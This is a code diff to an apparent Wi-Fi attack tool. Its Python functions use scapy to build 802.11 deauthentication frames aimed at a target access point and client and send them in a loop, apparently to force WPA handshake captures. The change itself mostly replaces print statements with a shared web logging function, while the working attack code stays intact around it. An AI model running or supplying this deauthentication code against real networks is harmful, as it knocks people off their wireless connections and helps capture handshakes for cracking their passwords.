@@ -4,6 +4,9 @@ import sys
 import subprocess
 from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
+from web.shared import add_log_message_shared as add_log_message
+
 def deauth_worker(target_bssid, target_client, network_interface, count, interval, stop_signal):
     """Worker function for deauthentication attacks"""
     print(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid}")
@@ -98,7 +101,7 @@ def deauth_worker(target_bssid, target_client, network_interface, count, interva
     
 def deauth_worker_for_handshake(target_bssid, target_client, network_interface, count, interval, stop_signal):
     """Sends deauthentication packets in a loop until stop_signal is set."""
-    print(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid} on {network_interface}")
+    add_log_message(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid} on {network_interface}")
     dot11 = Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid)
     deauth_frame_to_client = RadioTap() / dot11 / Dot11Deauth(reason=7)
 
@@ -108,12 +111,12 @@ def deauth_worker_for_handshake(target_bssid, target_client, network_interface, 
             sendp(deauth_frame_to_client, iface=network_interface, count=count, inter=0.005, verbose=False)
             stop_signal.wait(interval)
         except OSError as e:
-            print(f"[Deauth Thread] Error sending packets: {e}. Stopping deauth.")
-            print("[Deauth Thread] Ensure the interface is in monitor mode and up.")
+            add_log_message(f"[Deauth Thread] Error sending packets: {e}. Stopping deauth.")
+            add_log_message("[Deauth Thread] Ensure the interface is in monitor mode and up.")
             stop_signal.set()
             break
         except Exception as e:
-            print(f"[Deauth Thread] An unexpected error occurred: {e}")
+            add_log_message(f"[Deauth Thread] An unexpected error occurred: {e}")
             time.sleep(1)
 
     print("[Deauth Thread] Stopped.")
